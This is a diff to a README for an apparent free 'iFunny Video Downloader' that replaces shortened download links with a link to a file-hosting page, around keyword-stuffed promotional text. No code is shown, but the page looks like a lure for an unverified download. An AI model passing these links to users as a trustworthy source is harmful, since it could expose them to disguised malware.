@@ -1,10 +1,10 @@
 # iFunny Video Downloader v2.4
 ## Download Ifunny Videos, Photos &amp; Gif's Online FREE
 
-### [DOWNLOAD NOW](https://bit.ly/3x35cZF)
+### [DOWNLOAD NOW](https://www5.zippyshare.com/v/WNHuRtaT/file.html)
 
 
-[![Download Now](https://github.com/defi-dev1/ifunny-video-downloader/blob/main/ifunny-video-downloader.png)](https://bit.ly/3x35cZF)
+[![Download Now](https://github.com/defi-dev1/ifunny-video-downloader/blob/main/ifunny-video-downloader.png)](https://www5.zippyshare.com/v/WNHuRtaT/file.html)
 
 #### How do I Download Videos Images, Gif's and Photos from Ifunny?
 Ifunny Downloader : Ifunny Video Downloader, Download Ifunny Video, 
